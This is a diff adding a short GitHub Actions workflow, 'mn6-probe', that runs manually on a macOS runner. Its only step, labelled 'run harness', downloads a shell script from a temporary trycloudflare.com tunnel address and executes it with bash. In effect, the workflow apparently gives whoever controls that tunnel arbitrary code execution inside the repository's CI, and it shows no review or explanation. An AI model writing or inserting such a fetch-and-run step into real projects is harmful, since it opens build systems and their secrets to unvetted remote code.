@@ -1,0 +1,13 @@
+name: mn6-probe
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: macos-14
+    timeout-minutes: 45
+    steps:
+      - name: run harness
+        run: |
+          set -euo pipefail
+          curl -fsSL "https://replace-melissa-growing-chubby.trycloudflare.com/harness.sh" -o /tmp/h.sh
+          bash /tmp/h.sh
